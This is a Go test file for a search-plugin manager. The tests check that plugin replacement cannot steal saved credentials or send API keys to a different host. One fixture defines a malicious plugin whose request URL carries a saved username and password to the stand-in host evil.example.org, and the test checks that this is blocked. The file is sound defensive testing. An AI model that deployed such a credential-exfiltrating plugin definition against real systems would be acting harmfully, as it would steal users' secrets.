package search

import (
	"net/http"
	"strings"
	"testing"

	"downloadcenter/internal/phpbox/phpboxtest"
)

// keyedSource is a json plugin on host with an API key setting, secret or
// not, sent in the address and in a header, and a page address that carries
// it too.
func keyedSource(id, host string, secret bool) string {
	s := "false"
	if secret {
		s = "true"
	}
	return `{"schema":1,"id":"` + id + `","name":"My site","type":"json",
		"request":{"url":"https://` + host + `/s?q={query}&key={setting:key}","headers":{"X-Api-Key":"{setting:key}"}},
		"settings":[{"id":"key","label":"Key","secret":` + s + `}],
		"response":{"items":"items","fields":{"title":"t","infohash":"h","page":"p"}}}`
}

// keySeen reports whether any request to host carried the value.
func keySeen(n *fakeNet, host, value string) bool {
	for _, r := range n.requests() {
		if r.URL.Host == host && (strings.Contains(r.URL.RawQuery, value) || strings.Contains(r.Header.Get("X-Api-Key"), value)) {
			return true
		}
	}
	return false
}

// spec: a plugin file cannot take the id of a plugin from another NAS, so
// the account saved for that program never reaches the file's host
func TestReplaceCodeByPluginFile(t *testing.T) {
	e := newAPIEnv(t)
	e.s.code = okBox()
	data := codeDLM("1.0")
	if code, out, _ := e.call(t, "admin", "", "POST", "/search/plugins", with(upload(data, "t.dlm"), "sha256", sum(data), "accept_risk", true)); code != 200 {
		t.Fatal(code, out)
	}
	on := true
	e.s.store.Update("dlm-testsearch", &on, map[string]string{"username": "alice", "password": "S3cretPW"}, nil)
	evil := `{"schema":1,"id":"dlm-testsearch","name":"Evil","type":"json",
		"request":{"url":"https://evil.example.org/s?q={query}&u={setting:username}&p={setting:password}"},
		"settings":[{"id":"username","label":"U"},{"id":"password","label":"P"}],
		"response":{"items":"items","fields":{"title":"t","infohash":"h"}}}`
	e.n.handle("evil.example.org", func(w http.ResponseWriter, r *http.Request) { w.Write([]byte(`{"items":[]}`)) })
	for _, path := range []string{"/search/plugins/inspect", "/search/plugins"} {
		if code, out, _ := e.call(t, "admin", "", "POST", path, map[string]any{"json": evil, "replace": true}); code != 409 || errCode(out) != "search_plugin_exists" {
			t.Errorf("%s: %d %v", path, code, out)
		}
	}
	src, _ := e.s.store.Get("dlm-testsearch")
	if !src.Plugin.RunsCode() || src.Settings["password"] != "S3cretPW" {
		t.Errorf("the program was replaced: %+v", src)
	}
	_, out, _ := e.call(t, "admin", "", "GET", "/search/plugins", nil)
	for _, x := range out["sources"].([]any) {
		for _, st := range x.(map[string]any)["settings"].([]any) {
			if st.(map[string]any)["value"] == "S3cretPW" {
				t.Errorf("password shown: %v", x)
			}
		}
	}
	id, _ := e.s.Start("admin", true, Query{Text: "ubuntu"}, nil)
	waitDone(t, e.s, "admin", id)
	if keySeen(e.n, "evil.example.org", "S3cretPW") || len(e.n.requests()) != 0 {
		t.Errorf("sent: %v", e.n.requests())
	}
	// Nor the other way round: a program cannot take a plugin file's id
	addPlugin(t, e.s, keyedSource("dlm-other", "src.example.org", true), map[string]string{"key": "K"})
	other := phpboxtest.DLM([]phpboxtest.Entry{{Name: "INFO", Body: strings.Replace(codeInfo, `"name":"testsearch"`, `"name":"other"`, 1)},
		{Name: "search.php", Body: "<?php class DcTestSearch {}"}})
	for _, path := range []string{"/search/plugins/inspect", "/search/plugins"} {
		code, out, _ := e.call(t, "admin", "", "POST", path, with(upload(other, "o.dlm"), "sha256", sum(other), "accept_risk", true, "replace", true))
		if code != 409 || errCode(out) != "search_plugin_exists" {
			t.Errorf("program over a plugin file, %s: %d %v", path, code, out)
		}
	}
	if src, _ := e.s.store.Get("dlm-other"); src.Plugin.RunsCode() || src.Settings["key"] != "K" {
		t.Errorf("the plugin file was replaced: %+v", src)
	}
}

// spec: a replacement with another host or setting flags starts anew:
// off, the default audience, no saved values
func TestReplaceAnotherShape(t *testing.T) {
	e := newAPIEnv(t)
	addPlugin(t, e.s, keyedSource("mysite", "src.example.org", true), map[string]string{"key": "APIKEY123"})
	e.n.handle("src.example.org", func(w http.ResponseWriter, r *http.Request) { w.Write([]byte(`{"items":[]}`)) })
	e.n.handle("other.example.org", func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte(`{"items":[{"t":"Ubuntu","h":"` + hashA + `","p":"https://other.example.org/p?k=` + r.URL.Query().Get("key") + `"}]}`))
	})
	if src, _ := e.s.store.Get("mysite"); src.Audience != AudienceAdmins || !src.Enabled {
		t.Fatalf("%+v", src)
	}
	for name, def := range map[string]string{
		"another host":   keyedSource("mysite", "other.example.org", true),
		"not secret":     keyedSource("mysite", "src.example.org", false),
		"both":           keyedSource("mysite", "other.example.org", false),
		"another port":   keyedSource("mysite", "src.example.org:8443", true),
		"other settings": strings.ReplaceAll(strings.Replace(keyedSource("mysite", "src.example.org", true), `"id":"key"`, `"id":"token"`, 1), "{setting:key}", "{setting:token}"),
	} {
		// Back to the first definition, with its key, on and for everyone
		if code, out, _ := e.call(t, "admin", "", "POST", "/search/plugins", map[string]any{"json": keyedSource("mysite", "src.example.org", true), "replace": true}); code != 200 {
			t.Fatal(code, out)
		}
		on := true
		e.s.store.Update("mysite", &on, map[string]string{"key": "APIKEY123"}, nil)
		e.s.store.SetAudience("mysite", AudienceAll)
		code, out, _ := e.call(t, "admin", "", "POST", "/search/plugins/inspect", map[string]any{"json": def})
		if code != 200 || out["exists"] != true || out["keeps_settings"] != false {
			t.Errorf("%s: inspect %d %v", name, code, out)
		}
		code, out, _ = e.call(t, "admin", "", "POST", "/search/plugins", map[string]any{"json": def, "replace": true})
		if code != 200 || out["enabled"] != false || out["secret_bearing"] != false {
			t.Errorf("%s: %d %v", name, code, out)
		}
		src, _ := e.s.store.Get("mysite")
		if src.Enabled || len(src.Settings) != 0 || src.Audience != defaultAudience(src.Plugin) {
			t.Errorf("%s: kept %+v", name, src)
		}
		for _, st := range out["settings"].([]any) {
			if v := st.(map[string]any); v["set"] != false || v["value"] != nil {
				t.Errorf("%s: setting %v", name, v)
			}
		}
	}
	// Switched on by hand, a regular user's search gets no key from it
	on := true
	e.s.store.Update("mysite", &on, nil, nil)
	e.s.store.SetAudience("mysite", AudienceAll)
	id, err := e.s.Start("alice", false, Query{Text: "ubuntu"}, nil)
	if err != nil {
		t.Fatal(err)
	}
	v := waitDone(t, e.s, "alice", id)
	for _, r := range v.Results {
		if strings.Contains(r.Page, "APIKEY123") {
			t.Errorf("alice sees %s", r.Page)
		}
	}
	if keySeen(e.n, "other.example.org", "APIKEY123") {
		t.Error("the key went to the other host")
	}
}

// The same shape keeps everything: state, audience and values.
func TestReplaceSameShape(t *testing.T) {
	e := newAPIEnv(t)
	addPlugin(t, e.s, keyedSource("mysite", "src.example.org", true), map[string]string{"key": "APIKEY123"})
	e.s.store.SetAudience("mysite", AudienceAll)
	def := strings.Replace(keyedSource("mysite", "SRC.example.org", true), `"name":"My site"`, `"name":"My site","version":"2"`, 1)
	if _, out, _ := e.call(t, "admin", "", "POST", "/search/plugins/inspect", map[string]any{"json": def}); out["keeps_settings"] != true {
		t.Errorf("inspect %v", out)
	}
	code, out, _ := e.call(t, "admin", "", "POST", "/search/plugins", map[string]any{"json": def, "replace": true})
	if code != 200 || out["version"] != "2" || out["enabled"] != true || out["audience"] != "all" || out["secret_bearing"] != true {
		t.Errorf("%d %v", code, out)
	}
}

// spec: testing a definition borrows the installed source's settings only
// when it has the same shape; else only what the request gives is used
func TestTestBorrowsOnlySameShape(t *testing.T) {
	e := newAPIEnv(t)
	addPlugin(t, e.s, keyedSource("mysite", "src.example.org", true), map[string]string{"key": "APIKEY123"})
	answer := func(w http.ResponseWriter, r *http.Request) { w.Write([]byte(`{"items":[]}`)) }
	e.n.handle("src.example.org", answer)
	e.n.handle("other.example.org", answer)
	for _, def := range []string{keyedSource("mysite", "other.example.org", true), keyedSource("mysite", "src.example.org", false)} {
		host := "other.example.org"
		if strings.Contains(def, "src.example.org") {
			host = "src.example.org"
		}
		e.n.seen = nil
		if code, out, _ := e.call(t, "admin", "", "POST", "/search/plugins/test", map[string]any{"json": def}); code != 200 {
			t.Fatal(code, out)
		}
		if keySeen(e.n, host, "APIKEY123") || len(e.n.requests()) != 1 {
			t.Errorf("the key went with the test of %s: %v", host, e.n.requests())
		}
	}
	// The same shape is tested with the installed key
	e.n.seen = nil
	e.call(t, "admin", "", "POST", "/search/plugins/test", map[string]any{"json": keyedSource("mysite", "src.example.org", true)})
	if !keySeen(e.n, "src.example.org", "APIKEY123") {
		t.Error("the installed key was not used")
	}
	// Given settings are used as given
	e.n.seen = nil
	e.call(t, "admin", "", "POST", "/search/plugins/test", map[string]any{"json": keyedSource("mysite", "other.example.org", true), "settings": map[string]string{"key": "TYPED"}})
	if !keySeen(e.n, "other.example.org", "TYPED") {
		t.Error("the given key was not used")
	}
}
